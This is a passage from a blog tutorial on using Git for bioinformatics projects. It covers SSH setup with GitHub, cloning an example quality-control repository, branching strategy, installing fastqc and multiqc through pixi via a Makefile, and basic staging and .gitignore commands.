<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">This site also has documentation on connecting to remote servers using SSH: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/administration/ssh-remote-server"><strong>SSH setup</strong></a></li>
<li class="">You can stop after creating the key pair</li>
</ul></div></div>
<p>Add your public key to GitHub by navigating to <code>Settings</code> → <code>SSH</code> section</p>
<p><img decoding="async" loading="lazy" alt="ssh" src="https://riverxdata.github.io/river-docs/assets/images/add_ssh_key-3e0aad975cfda9eedf750303c36b86c2.png" width="1374" height="911" class="img_ev3q"></p>
<p>Now test your connection to GitHub:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> git@github.com</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># PTY allocation request failed on channel 0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Hi nttg8100! You've successfully authenticated, but GitHub does not provide shell access.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Connection to github.com closed.</span><br></span></code></pre></div></div>
<p>You're ready to clone. Open your terminal, navigate to your working directory, and clone the repository:</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">To clone a specific branch or tag, add <code>-b &lt;branch-name&gt;</code></li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># clone (equivalent to: git clone git@github.com:nttg8100/ngs-quality-control-for-blog-example.git -b main)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone git@github.com:nttg8100/ngs-quality-control-for-blog-example.git</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> ngs-quality-control-for-blog-example</span><br></span></code></pre></div></div>
<p>Open the code with your editor. Here I use Visual Studio Code:</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Download and install Visual Studio Code: <a href="https://code.visualstudio.com/download" target="_blank" rel="noopener noreferrer" class="">https://code.visualstudio.com/download</a></p></div></div>
<p><img decoding="async" loading="lazy" alt="download_vscode" src="https://riverxdata.github.io/river-docs/assets/images/visual_studio_code-e5f1105eab16be8a6a6a51ff90efacde.png" width="1374" height="911" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="your-code-editor">Your Code Editor<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#your-code-editor" class="hash-link" aria-label="Direct link to Your Code Editor" title="Direct link to Your Code Editor" translate="no">​</a></h2>
<p>In your terminal, you can open the entire repository (which is just a folder). Simply use your mouse to select the terminal icon in the footer.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">Now you can select any file you want to edit—everything is a text file</li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">code </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="editor" src="https://riverxdata.github.io/river-docs/assets/images/editor-62a54435276d5a2a10b60dd04f6ef7ba.png" width="1433" height="894" class="img_ev3q"></p>
<p>Now follow these steps to establish good version control practices.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="branching-strategy">Branching Strategy<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#branching-strategy" class="hash-link" aria-label="Direct link to Branching Strategy" title="Direct link to Branching Strategy" translate="no">​</a></h2>
<p><img decoding="async" loading="lazy" alt="branch" src="https://riverxdata.github.io/river-docs/assets/images/git_branch-e9d4d8cd28ce32661c296af5c8fd85ec.png" width="1280" height="719" class="img_ev3q"></p>
<p>A branching strategy is a workflow that helps teams manage codebase changes in a structured way. Git branches allow you to work on new features, bug fixes, or experiments without affecting the main codebase.</p>
<p><strong>Common branching strategies:</strong></p>
<ul>
<li class="">
<p><strong>Main (or <code>master</code>) branch:</strong>
The stable branch that always contains production-ready code</p>
</li>
<li class="">
<p><strong>Feature branches:</strong>
Create a new branch for each feature or task (e.g., <code>feature/quality-control</code>). This keeps development isolated until the feature is complete</p>
</li>
<li class="">
<p><strong>Development branch:</strong>
Some teams use a <code>develop</code> branch as an integration branch for features before merging into <code>main</code></p>
</li>
<li class="">
<p><strong>Hotfix/bugfix branches:</strong>
For urgent fixes, create a branch from <code>main</code> (e.g., <code>hotfix/fix-typo</code>) and merge back after testing</p>
</li>
</ul>
<p><strong>Typical workflow:</strong></p>
<ol>
<li class="">Create a new branch from <code>main</code> for your feature or fix</li>
<li class="">Work on your changes and commit them to your branch</li>
<li class="">Open a pull request (PR) to merge your branch into <code>main</code> (or <code>develop</code>)</li>
<li class="">Review, test, and merge the PR</li>
</ol>
<p>This approach:</p>
<ul>
<li class="">Keeps the <code>main</code> branch stable</li>
<li class="">Makes collaboration easier</li>
<li class="">Helps track changes and review code before merging</li>
</ul>
<p>Now let's create a new branch. Our goal is to set up easy installation of fastqc and multiqc. We'll write a bash script for analysis later. For simplicity, we'll develop feature branches and merge them directly to main, which works well for small projects like this.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create and switch to a new branch from main</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> switch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> feature/environment-setup</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="new-branch-environment-setup">New Branch: Environment Setup<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#new-branch-environment-setup" class="hash-link" aria-label="Direct link to New Branch: Environment Setup" title="Direct link to New Branch: Environment Setup" translate="no">​</a></h2>
<p>Instead of conda, I prefer to install pixi, then install multiqc and fastqc. Create a Makefile for installation—you can either edit a new <code>Makefile</code> manually or generate it with bash.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>A Makefile is a special file used by the make build automation tool. It defines rules and instructions for building and managing projects, especially in languages like C/C++. However, it can be used for any project, including Node.js, React, and TypeScript, to automate repetitive tasks.</p><p><strong>Key Concepts:</strong></p><ul>
<li class=""><strong>Targets</strong>: What you want to build (e.g., a file or a label for a task)</li>
<li class=""><strong>Dependencies</strong>: Files or targets that must be up-to-date before the target can be built</li>
<li class=""><strong>Recipes</strong>: Shell commands to run to build the target</li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> Makefile</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token string variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/.pixi/bin/pixi:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  mkdir -p </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token string variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/.pixi/bin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  curl -sSL https://pixi.dev/install.sh | sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify the newly created file content</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> Makefile</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><p><strong>Pro Tip:</strong>
When writing your <code>Makefile</code>, use <code>.PHONY</code> targets for commands that don't produce files with the same name. This prevents conflicts and ensures your commands always run as expected. Keep installation steps modular—separate environment setup, tool installation, and analysis scripts into different targets for clarity and reusability.</p></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> ~/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Initialize pixi in your current repository</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi init </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--channel</span><span class="token plain"> conda-forge </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--channel</span><span class="token plain"> bioconda</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install multiqc and fastqc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> fastqc multiqc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Activate the pixi shell</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi shell</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify tools are installed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">which</span><span class="token plain"> fastqc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">which</span><span class="token plain"> multiqc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /home/giangnguyen/Documents/dev/docs/ngs-quality-control-for-blog-example/.pixi/envs/default/bin/fastqc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /home/giangnguyen/Documents/dev/docs/ngs-quality-control-for-blog-example/.pixi/envs/default/bin/multiqc</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-git-commands">Common Git Commands<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#common-git-commands" class="hash-link" aria-label="Direct link to Common Git Commands" title="Direct link to Common Git Commands" translate="no">​</a></h2>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><p>You can check git history to see who made changes—useful for accountability when needed</p></div></div>
<p>Check your current status to see uncommitted files. Use command line to add files to your commit:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> status</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="uncommited" src="https://riverxdata.github.io/river-docs/assets/images/status_uncommit-a95910e3649a2fedc8c2f9a005b295d4.png" width="1364" height="266" class="img_ev3q"></p>
<p>Add files to commit and review changes:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add files one by one</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> .gitignore</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> .gitattributes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> pixi.lock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> pixi.toml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or add all files/folders in the current repository</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify staged files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> status</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="committed" src="https://riverxdata.github.io/river-docs/assets/images/status_after_add-d297b354af1341187b0eb93b9d8b48b4.png" width="1364" height="172" class="img_ev3q"></p>
<p>Sometimes you might accidentally stage the wrong files. Remove them from the current commit:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create a wrong file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> wrong_file.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> wrong_file.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Restore it to unstaged status</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> restore </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--staged</span><span class="token plain"> wrong_file.txt</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="restore" src="https://riverxdata.github.io/river-docs/assets/images/restore-06b0ba67bbee8210236bd8781d9b078d.png" width="1364" height="461" class="img_ev3q"></p>
<p>If you need files locally but don't want to commit them, add them to .gitignore. This prevents them from being committed even when using <code>git add .</code>. .gitignore can ignore both files and folders.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">For better control, create .gitignore in the specific folder/subfolder where unwanted files/folders are located</li>
<li class="">Common .gitignore patterns: environment folders (<code>.env</code>, <code>.pixi</code>), <code>node_modules</code>, data folders (<code>data</code>), <code>*.tar.gz</code>, cache folders (<code>__pycache__</code>)</li>
<li class="">To ignore an entire folder but keep specific files, use <code>!&lt;filename&gt;</code> to keep only needed files</li>
</ul><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">folder</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">!folder/file.txt</span><br></span></code></pre></div></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add to gitignore</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"wrong_file.txt"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> .gitignore</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View the file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .gitignore</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 